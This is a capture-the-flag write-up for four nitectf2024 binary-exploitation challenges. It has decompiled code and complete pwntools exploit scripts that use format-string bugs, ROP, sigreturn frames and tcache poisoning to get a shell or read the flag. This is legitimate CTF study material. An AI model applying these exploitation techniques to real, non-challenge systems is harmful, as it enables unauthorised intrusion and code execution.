# Print The Gifts

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+Fh] [rbp-71h] BYREF
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  while ( 1 )
  {
    v4 = 32;
    printf("What gift do you want from santa\n>");
    fgets(s, 100, stdin);
    printf("Santa brought you a ");
    printf(s);
    puts("do you want another gift?\nEnter y or n:");
    __isoc99_scanf("%c", &v4);
    if ( v4 == 110 )
      break;
    getchar();
  }
  return 0;
}
```

With FSB, I can leak libc\_base and main's stack address. And ROP with FSB. Since I use fmtstr\_payload, length of payload to write 64bit data exceed 100 bytes. So I split payload to 32bits, and put it in the stack.

## Exploit

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
context.arch = 'amd64'

p = remote('print-the-gifts.chals.nitectf2024.live', 1337, ssl=True)
#p = process('./chall')
l = ELF('./libc.so.6')

def send_msg(payload : bytes, re : bytes):
    print(len(payload))
    assert len(payload) < 100
    p.sendlineafter(b'>', payload)
    p.recvuntil(b'Santa brought you a ')
    msg = p.recvline()[:-1]
    p.sendlineafter(b':', re)
    return msg


sfp = int(send_msg(b'%p', b'y'), 16) - (0x7fffffffa680 - 0x7fffffffc820)
print(hex(sfp))
l.address = int(send_msg(b'%23$p', b'y'), 16) - (0x7ffff7e0924a - 0x7ffff7de2000)
print(hex(l.address))

ret = l.address + 0x0000000000026e99
system = l.sym['system']
binsh = list(l.search(b'/bin/sh'))[0]
pop_rdi = l.address + 0x00000000000277e5

#gdb.attach(p)

payload = fmtstr_payload(8, {sfp + 0x8 : ret & 0xffffffff})
send_msg(payload, b'y')
payload = fmtstr_payload(8, {sfp + 0x8 + 0x4 : (ret >> 32) & 0xffffffff})
send_msg(payload, b'y')
payload = fmtstr_payload(8, {sfp + 0x10 : pop_rdi & 0xffffffff})
send_msg(payload, b'y')
payload = fmtstr_payload(8, {sfp + 0x10 + 0x4 : (pop_rdi >> 32) & 0xffffffff})
send_msg(payload, b'y')
payload = fmtstr_payload(8, {sfp + 0x18 : binsh & 0xffffffff})
send_msg(payload, b'y')
payload = fmtstr_payload(8, {sfp + 0x18 + 0x4 : (binsh >> 32) & 0xffffffff})
send_msg(payload, b'y')
payload = fmtstr_payload(8, {sfp + 0x20 : system & 0xffffffff})
send_msg(payload, b'y')
payload = fmtstr_payload(8, {sfp + 0x20 + 0x4 : (system >> 32) & 0xffffffff})
send_msg(payload, b'n')
p.interactive()
```

---

# Mixed Signal

In main, it opens flag file, sets seccomp and calls vuln function.

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000028  if (A != sendfile) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x00000000  return KILL
```

With this seccomp, we can use sendfile. In vuln, it reads 0x12C bytes. So I exploit it with Sigreturn. One problem is flag file's fd. In local, fd is 3. But in remote, because they use socat, fd is 5.

## Exploit

```C
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
context.arch = 'amd64'

#p = remote('127.0.0.1', 1337)
p = remote('mixed-signal.chals.nitectf2024.live', 1337, ssl=True)
#p = process('chale')
e = ELF('chal')
bss = e.bss()
ret = 0x0000000000401016
syscall = 0x000000000040119a
vuln = e.sym['vuln']
print(hex(vuln))

p.recvuntil(b'freakbob calling,pickup!')
payload = b'a' * 8 + p64(bss + 0x200) + p64(vuln + 4)
#gdb.attach(p)
p.send(payload)
pause()

read_frame = SigreturnFrame()
read_frame.rax = 40
read_frame.rdi = 1
read_frame.rsi = 5
read_frame.rdx = 0
read_frame.r10 = 0x100
read_frame.rip = syscall
read_frame.rsp = bss + 0x208
payload = b'a' * 8 + p64(bss + 0x200) + p64(vuln + 1) + p64(ret) + p64(syscall) + bytes(read_frame)
#payload = p64(e.sym['main'] + 0x51) + p64(bss + 0x200) + p64(e.sym['main'] + 0x51) + p64(syscall) + bytes(read_frame)
print(len(payload))
p.send(payload)
pause()
p.send(p64(vuln) + b'a' * 7)
pause()
p.interactive()
```

---

# Chaterine

Main function have two FSB.

```C
fgets(s, 11, stdin);
s[12] = 0;
printf("Hello ");
printf(s);
```

I use first FSB to get main's stack address.

```C
case 2:
  printf("Enter index:");
  __isoc99_scanf("%d", &v6);
  fflush(_bss_start);
  if ( v6 <= 0xF )
    free(*((void **)&messages + (int)v6));
  break;

case 3:
  printf("Enter index:");
  __isoc99_scanf("%d", &v6);
  if ( v6 <= 0xF )
  {
    getchar();
    fgets(*((char **)&messages + (int)v6), size[v6], stdin);
    printf(*((const char **)&messages + (int)v6));
    printf("has been written");
  }
  break;
```

I use first FSB to get heap\_base.  
In free(case 2), it causes UAF. Using edit(case 3), I can change freed chunk's tcache key. So I use tcache positioning.  
If I change s value to "spiderdrive", I can get shell. malloc in stack, and edit to "spiderdrive".

## Exploit

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
context.arch = 'amd64'

#p = remote('127.0.0.1', 1337)
p = remote('chaterine.chals.nitectf2024.live', 1337, ssl=True)
#p = process('chall')

def _malloc(idx : int, size : int):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b':', str(idx).encode())
    p.sendlineafter(b':', str(size).encode())

def _free(idx : int):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b':', str(idx).encode())

def _edit(idx : int, payload : bytes):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b':', str(idx).encode())
    sleep(1)
    p.sendline(payload)
    return p.recvline()

def _getshell():
    p.sendlineafter(b'>>', b'4')

sleep(1)
p.sendline(b'%p')
p.recvuntil(b'Hello ')
sp = int(p.recvline()[:-1], 16) - (0x7fffffffa640 - 0x7fffffffc770)

_malloc(0, 10)
_malloc(1, 10)
heap_base = int(_edit(1, b'%p%p%p')[:-1].split(b'0x')[3], 16)
_free(0)
_edit(0, b'a' * 9)
_free(0)
_edit(0, p64(sp ^ (heap_base >> 12)))
_malloc(2, 10)
_malloc(3, 16)
_edit(3, b'spiderdrive')
_getshell()
p.interactive()
```

---

# Hook The World

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  int v6; // [rsp+4h] [rbp-DCh] BYREF
  unsigned int v7; // [rsp+8h] [rbp-D8h] BYREF
  int v8[17]; // [rsp+Ch] [rbp-D4h] BYREF
  void *ptr[15]; // [rsp+50h] [rbp-90h]
  unsigned __int64 v10; // [rsp+C8h] [rbp-18h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("Even with my hooked arm,me and my crew shall explore this cruel sea and get rich!");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          printf(
            "1.Get huge chest\n"
            "2.Make the lazy people walk the plank\n"
            "3.Fill your chests!\n"
            "4.Make the quartermaster review the profit\n"
            ">");
          __isoc99_scanf("%d", &v6);
          if ( v6 != 1 )
            break;
          printf("Chest number:");
          __isoc99_scanf("%d", v8);
          printf("Chest size:");
          __isoc99_scanf("%d", &v7);
          if ( v8[0] > 0xFu || v7 > 0x100 )
            return __readfsqword(0x28u) ^ v10;
          v3 = v8[0];
          ptr[v3] = malloc((int)v7);
          v8[v8[0] + 1] = v7;
        }
        if ( v6 != 2 )
          break;
        printf("Idiot crew memebr #:");
        __isoc99_scanf("%d", v8);
        if ( v8[0] > 0xFu )
          return __readfsqword(0x28u) ^ v10;
        free(ptr[v8[0]]);
      }
      if ( v6 != 3 )
        break;
      printf("Chest nunmber:\n>");
      __isoc99_scanf("%d", v8);
      getchar();
      fgets((char *)ptr[v8[0]], v8[v8[0] + 1], stdin);
    }
    if ( v6 != 4 )
      break;
    printf("Chest no:");
    __isoc99_scanf("%d", v8);
    if ( v8[0] > 0xFu )
      break;
    write(1, ptr[v8[0]], (unsigned int)v8[v8[0] + 1]);
  }
  return __readfsqword(0x28u) ^ v10;
}
```

In free method, it causes UAF. With edit method, I can use DFB. If I fill tcache bin and malloc another chunk with size 0x90 and free it, it gets in unsorted bin. With write method, I get libc\_base. \_\_environ have stack address. So I malloc the chunk in \_\_environ using tcache positioning and read stack address -> get main's sfp stack address. With this informations, I can write one\_gadget in ret.

## Exploit

```python
from pwn import *
from tqdm import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('hook-the-world.chals.nitectf2024.live', 1337, ssl=True)
#p = process('./chall')
l = ELF('./libc.so.6')

def _malloc(idx : int, size : int):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', str(idx).encode())
    p.sendlineafter(b':', str(size).encode())

def _free(idx : int):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', str(idx).encode())

def _edit(idx : int, payload : bytes):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b':', str(idx).encode())
    sleep(1)
    p.sendline(payload)

def _read(idx : int):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b':', str(idx).encode())
    return p.recvline()

for i in trange(9):
    _malloc(i, 0x90)

for i in trange(8):
    _free(i)

l.address = u64(_read(7)[:6].ljust(8, b'\x00')) - (0x7ffff7dcdca0 - 0x7ffff79e2000)
print(hex(l.address))

for i in trange(8):
    _malloc(i, 0x90)

_free(0)
_edit(0, b'a' * 9)
_free(0)
_edit(0, p64(l.sym['__environ']))
_malloc(1, 0x90)
_malloc(2, 0x90)
sfp = u64(_read(2)[:6].ljust(8, b'\x00')) - (0x7fffffffc8b8 - 0x7fffffffc7c0)
print(hex(sfp))

o = [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc]
og = [l.address + i for i in o]
_free(3)
_edit(3, b'a' * 9)
_free(3)
_edit(3, p64(sfp))
_malloc(4, 0x90)
_malloc(5, 0x90)
#gdb.attach(p)
_edit(5, b'a' * 8 + p64(og[2]))
p.sendlineafter(b'>', b'0')
p.interactive()
```